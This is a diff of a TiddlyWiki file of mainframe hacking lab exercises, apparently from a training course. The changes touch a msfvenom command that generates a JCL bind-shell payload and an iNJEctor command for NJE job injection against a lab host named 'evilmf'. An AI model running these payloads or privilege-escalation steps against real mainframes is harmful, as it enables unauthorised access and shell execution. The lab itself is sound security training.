@@ -8932,22 +8932,15 @@ Error message and password prompt
 [[Lab 10 - z/OS Enumeration]]
 [[Lab 11 - NJE Privesc]]</pre>
 </div>
-<div status="complete" title="$:/Import">
-<pre>The following tiddlers were imported:
-
-# [[$:/config/PageControlButtons/Visibility/$:/core/ui/Buttons/home]]
-# [[$:/DefaultTiddlers]]
-# [[$:/isEncrypted]]
-# [[$:/SiteSubtitle]]
-# [[$:/SiteTitle]]
-# [[Lab 1 - Enumeration]]
-# [[Lab 2 - FTP Code Execution]]
-# [[Lab 3 - Metasploit &amp; Tomcat]]
-# [[Lab 4 - z/OS Enumeration]]
-# [[Lab 5 - Hacking Tomcat]]
-# [[Lab 5 - NJE Privesc]]
-# [[OLD - Lab 2 - Headless Interaction]]
-# [[OLD Lab 3 - CICSpwn and CICS fun]]</pre>
+<div plugin-type="import" status="pending" title="$:/Import" type="application/json">
+<pre>{
+    &quot;tiddlers&quot;: {
+        &quot;Untitled&quot;: {
+            &quot;title&quot;: &quot;Untitled&quot;,
+            &quot;text&quot;: &quot;&lt;span style=\&quot;color: rgb(221, 17, 68); font-family: SFMono-Regular, Consolas, &amp;quot;Liberation Mono&amp;quot;, Menlo, Courier, monospace; font-size: 15px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: 2; text-align: left; text-indent: 0px; text-transform: none; white-space: pre-wrap; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(247, 247, 249); text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;\&quot;&gt;ftp evi&lt;/span&gt;&quot;
+        }
+    }
+}</pre>
 </div>
 <div title="$:/isEncrypted">
 <pre>no</pre>
@@ -8964,7 +8957,7 @@ Error message and password prompt
 <div created="20181014015416622" modified="20201112173219743" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Open</pre>
 </div>
-<div list="[[Lab 1 - Login, Copy/Paste a File and Run It]] [[Lab 2 - REXX Shells]] [[Lab 3 - Jobs and JCL]] [[Lab 4 - RACF]] [[Lab 5 - Access Storage with REXX]] [[Lab 6 - Accessing CICS]] [[BONUS Lab 1 - TN3270]] [[BONUS Lab 2 - msfvenom]] [[Lab 7 - Enumeration]] [[Lab 8 - FTP Code Execution]] [[Lab 9 - Metasploit &amp; Tomcat]] [[Lab 10 - z/OS Enumeration]] [[Lab 11 - NJE Privesc]]" title="$:/StoryList">
+<div list="$:/Import [[Lab 1 - Login, Copy/Paste a File and Run It]] [[Lab 2 - REXX Shells]] [[Lab 3 - Jobs and JCL]] [[Lab 4 - RACF]] [[Lab 5 - Access Storage with REXX]] [[Lab 6 - Accessing CICS]] [[BONUS Lab 1 - TN3270]] [[BONUS Lab 2 - msfvenom]] [[Lab 7 - Enumeration]] [[Lab 8 - FTP Code Execution]] [[Lab 9 - Metasploit &amp; Tomcat]] [[Lab 10 - z/OS Enumeration]] [[Lab 11 - NJE Privesc]]" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -8980,7 +8973,7 @@ Error message and password prompt
         },
         &quot;$:/info/url/full&quot;: {
             &quot;title&quot;: &quot;$:/info/url/full&quot;,
-            &quot;text&quot;: &quot;file:///Users/chad/WorkInProgress/EM_Labs/Labs.html&quot;
+            &quot;text&quot;: &quot;file:///home/evilmf/Labs/Labs.html&quot;
         },
         &quot;$:/info/url/host&quot;: {
             &quot;title&quot;: &quot;$:/info/url/host&quot;,
@@ -9000,7 +8993,7 @@ Error message and password prompt
         },
         &quot;$:/info/url/pathname&quot;: {
             &quot;title&quot;: &quot;$:/info/url/pathname&quot;,
-            &quot;text&quot;: &quot;/Users/chad/WorkInProgress/EM_Labs/Labs.html&quot;
+            &quot;text&quot;: &quot;/home/evilmf/Labs/Labs.html&quot;
         },
         &quot;$:/info/url/search&quot;: {
             &quot;title&quot;: &quot;$:/info/url/search&quot;,
@@ -9012,11 +9005,11 @@ Error message and password prompt
         },
         &quot;$:/info/browser/screen/width&quot;: {
             &quot;title&quot;: &quot;$:/info/browser/screen/width&quot;,
-            &quot;text&quot;: &quot;1792&quot;
+            &quot;text&quot;: &quot;1920&quot;
         },
         &quot;$:/info/browser/screen/height&quot;: {
             &quot;title&quot;: &quot;$:/info/browser/screen/height&quot;,
-            &quot;text&quot;: &quot;1120&quot;
+            &quot;text&quot;: &quot;1107&quot;
         }
     }
 }</pre>
@@ -9184,13 +9177,13 @@ Great! Now you should see  `IBMECHO ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ` print
 !!!''Evil Thinking''
 * How could an attacker use SET'n'3270 in a corporate environment?</pre>
 </div>
-<div created="20181014014053567" modified="20201112173641858" tags="" title="BONUS Lab 2 - msfvenom">
+<div created="20181014014053567" modified="20210409215500139" tags="" title="BONUS Lab 2 - msfvenom">
 <pre>!!''Lab Objective''
 # Using Metasploit to generate JCL+HLASM
 # Using the generated JCL to get a USS shell
 
 !!''Create HLASM JCL with Metasploit''
-* Generate the JCL: `msfvenom -p cmd/mainframe/reverse_shell_jcl LPORT=&lt;number between 20000 and 39999&gt; &gt; hlasmuss`
+* Generate the JCL: `msfvenom -p cmd/mainframe/bind_shell_jcl LPORT=&lt;number between 20000 and 39999&gt; &gt; hlasmuss`
 ** This creates the file `hlasmuss`
 * Upload the file to `&lt;userid&gt;.JCLLIB(HLASMUSS)`
 ** Using any of the methods from the previous labs
@@ -9375,7 +9368,7 @@ There are multiple ways to list the APF Authorized Libraries:
 * Do you have better than read to any of these?
 * What could you do if you did?</pre>
 </div>
-<div created="20190515034456720" modified="20201118183859371" tags="" title="Lab 11 - NJE Privesc">
+<div created="20190515034456720" modified="20210409215435588" tags="" title="Lab 11 - NJE Privesc">
 <pre>!!''Lab Objectives''
 # Use njelib to connect and submit a job
 # Identify OHOST and RHOST
@@ -9384,10 +9377,15 @@ We've setup an insecure NJE connection on port 175
 
 * The //ohost// is ''CLASS''
 * The //rhost// is ''EVIL''
+** You would typically find these in the JES2 parmlibs (i.e. config files)
 
 !!''Display Jes2 Information''
 * go to `Tools/NJElib`
-* Install bitstring: `pip install bitstring`
+* The version of python2 does not come with pip, these steps will install it:
+** Download get-pip.py: `curl https://bootstrap.pypa.io/pip/2.7/get-pip.py --output get-pip.py`
+** Install pip2: `sudo python2 get-pip.py`
+** Upgrade setup tools: `sudo pip2 install --upgrade setuptools`
+** Install bitstring: `pip2 install bitstring`
 * run iNJEctor replacing `&lt;rhost&gt;` and `&lt;ohost&gt;` with the values above: `./iNJEctor.py evilmf &lt;ohost&gt; &lt;rhost&gt;  \$djes2`
 * Enable debugging if you want to see the NJE protocol in detail by adding `-d` before the ohost
 * ''NOTE'' if it fails keep trying, only one person can connect at a time
